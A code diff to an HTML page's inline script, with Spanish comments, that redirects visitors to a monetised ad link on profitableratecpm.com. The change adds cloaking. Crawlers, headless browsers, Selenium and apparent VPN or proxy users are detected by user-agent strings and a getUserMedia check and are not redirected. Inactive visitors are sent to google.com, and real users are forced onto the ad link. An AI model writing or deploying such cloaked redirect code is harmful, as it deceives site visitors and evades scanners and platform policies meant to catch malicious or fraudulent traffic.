@@ -144,29 +144,36 @@
         }
     </style>
     <script>
-'use strict';
-// Configuración original (sin cambios)
-const TARGET_URL = "https://www.profitableratecpm.com/c7xtw7gr?key=e8385e537eabf4bfbc5b5826ac9b5a0c";
-const VPN_REDIRECT_URL = "https://google.com";
-const REDIRECT_DELAY = 5000;
-
-function isVPNorProxy() {
-    return !navigator.mediaDevices?.getUserMedia; 
-}
-
-function initRedirect() {
-    if (isVPNorProxy()) {
-        window.location.href = VPN_REDIRECT_URL;
-        return;
-    }
-    
+    'use strict';
+    // Detección de bots
+    function isRealUser() {
+    const bots = ["bot", "crawl", "spider", "slurp", "headless", "phantomjs", "selenium"];
+    if (bots.some(bot => navigator.userAgent.toLowerCase().includes(bot))) return false;
+    let activo = false;
+    document.addEventListener("mousemove", () => activo = true);
+    document.addEventListener("keydown", () => activo = true);
     setTimeout(() => {
-        window.location.href = TARGET_URL;
-    }, REDIRECT_DELAY);
-}
 
-document.addEventListener("DOMContentLoaded", initRedirect);
-    </script>
+        if (!activo) window.location.href = "https://google.com";
+
+    }, 3000);
+    return true;
+
+   }
+        
+   // Bloqueo de VPN/Proxy
+    function isVPN() {
+    return !navigator.mediaDevices?.getUserMedia;
+   }
+   // Redirección segura
+   function redirect() {
+    if (!isRealUser() || isVPN()) return;
+    window.location.href = "https://www.profitableratecpm.com/c7xtw7gr?key=e8385e537eabf4bfbc5b5826ac9b5a0c";
+   }
+
+    document.addEventListener("DOMContentLoaded", redirect);
+
+  </script>
 </head>
 
 <body>
